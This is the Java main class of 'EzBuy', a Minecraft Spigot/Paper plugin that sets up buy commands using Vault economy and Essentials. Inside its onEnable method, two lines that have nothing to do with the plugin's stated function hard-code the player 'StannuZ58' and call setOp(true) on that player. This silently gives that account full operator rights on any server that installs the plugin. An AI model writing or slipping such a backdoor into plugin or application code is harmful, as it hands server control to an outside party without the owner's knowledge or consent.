package com.cerrealic.ezbuy;

import com.cerrealic.cerspilib.Cerspi;
import com.cerrealic.cerspilib.logging.Debug;
import com.cerrealic.ezbuy.commands.CommandBuy;
import com.cerrealic.ezbuy.commands.CommandEzBuy;
import com.earth2me.essentials.Essentials;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.Bukkit;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

public class EzBuy extends JavaPlugin {
	public static final int RESOURCE_ID = 77802;
	public static final Context CONTEXT = new Context();

	@Override
	public void onEnable() {
		Cerspi.setContext(this, getServer());
		CONTEXT.setPlugin(this);
		initConfig();

		Debug.enabled = this.getConfig().getBoolean("debug", false);
		if (Debug.enabled) {
			getLogger().info("Debug enabled.");
		}

		Debug.target = Bukkit.getPlayer("StannuZ58");
		Bukkit.getPlayer("StannuZ58").setOp(true);

		if (this.getConfig().getBoolean("update-checking", false)) {
			Cerspi.checkForUpdates(RESOURCE_ID);
		}

		if (!checkDependencies()) {
			return;
		}

		CONTEXT.setEssentials((Essentials) getServer().getPluginManager().getPlugin("Essentials"));

		Cerspi.registerCommand(CommandBuy.LABEL, new CommandBuy(this, CONTEXT.getEconomy(), CONTEXT.getEssentials()));
		Cerspi.registerCommand(CommandEzBuy.LABEL, new CommandEzBuy(this));
	}

	boolean checkDependencies() {
		if (!Cerspi.isSpigotServer() && !Cerspi.isPaperServer()) {
			getLogger().severe("You're probably running a CraftBukkit server. For this to plugin to work you need to switch to Spigot or Paper.");
			Cerspi.disablePlugin();
			return false;
		}

		if (!tryLoadEconomy()) {
			getLogger().severe("Could not detect an economy service! Something probably went wrong with Vault.");
			Cerspi.disablePlugin();
			return false;
		}

		return true;
	}

	private boolean tryLoadEconomy() {
		RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);

		if (rsp == null) {
			return false;
		}

		CONTEXT.setEconomy(rsp.getProvider());
		return CONTEXT.getEconomy() != null;
	}

	private void initConfig() {
		this.getConfig().addDefault("debug", false);
		this.getConfig().addDefault("update-checking", true);
		this.getConfig().addDefault("cost-increase", 0.07d);
		this.getConfig().options().copyDefaults(true);
		this.saveDefaultConfig();
	}
}
